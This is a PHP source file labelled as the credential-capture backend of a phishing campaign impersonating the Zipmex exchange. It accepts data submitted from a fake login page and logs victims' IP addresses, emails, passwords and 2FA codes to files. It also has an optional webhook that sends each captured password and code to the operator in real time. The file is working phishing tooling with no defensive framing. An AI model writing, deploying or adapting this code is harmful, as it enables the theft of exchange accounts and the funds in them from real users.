<?php
/**
 * Zipmex Phishing Campaign - Credential Capture Backend
 * Captures login credentials and 2FA codes to encrypted log files
 */

// Configuration
$logDir = __DIR__ . '/logs';
$ipLogFile = $logDir . '/ip_log.txt';
$dataDir = $logDir . '/captures';

// Create directories
if (!is_dir($logDir)) mkdir($logDir, 0755, true);
if (!is_dir($dataDir)) mkdir($dataDir, 0755, true);

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    die(json_encode(['status' => 'error', 'message' => 'Invalid data']));
}

// Collect metadata
$metadata = [
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'cf_ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? null,
    'x_real_ip' => $_SERVER['HTTP_X_REAL_IP'] ?? null,
    'referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
    'timestamp' => date('Y-m-d H:i:s'),
    'device' => php_uname('n')
];

// Merge with submitted data
$record = array_merge($metadata, $data);

// Log IP + timestamp
file_put_contents($ipLogFile, date('Y-m-d H:i:s') . ' | ' . $metadata['ip'] . ' | ' . ($data['email'] ?? 'no-email') . "\n", FILE_APPEND | LOCK_EX);

// Save full capture to dated file
$captureFile = $dataDir . '/capture_' . date('Ymd_His') . '_' . substr(md5(uniqid()), 0, 8) . '.json';
file_put_contents($captureFile, json_encode($record, JSON_PRETTY_PRINT), LOCK_EX);

// Also append to master log for easy review
$masterLog = $dataDir . '/master_log.txt';
$logLine = sprintf(
    "[%s] IP: %s | Email: %s | Pass: %s | 2FA: %s | Type: %s\n",
    $record['timestamp'],
    $record['ip'],
    $record['email'] ?? 'N/A',
    $record['password'] ?? 'N/A',
    $record['totp'] ?? 'N/A',
    $record['type'] ?? 'unknown'
);
file_put_contents($masterLog, $logLine, FILE_APPEND | LOCK_EX);

// Send notification (optional - Telegram/Discord webhook)
$webhookUrl = ''; // Set your webhook here for instant notifications
if ($webhookUrl) {
    $message = "🔔 *Zipmex Credential Captured!*\n";
    $message .= "📧 Email: " . ($data['email'] ?? 'N/A') . "\n";
    if (isset($data['password'])) $message .= "🔑 Password: `" . $data['password'] . "`\n";
    if (isset($data['totp'])) $message .= "🔐 2FA: `" . $data['totp'] . "`\n";
    $message .= "🌐 IP: " . $metadata['ip'] . "\n";
    $message .= "🕐 Time: " . $record['timestamp'];
    
    $payload = json_encode(['content' => $message]);
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Return success (but without revealing anything)
header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
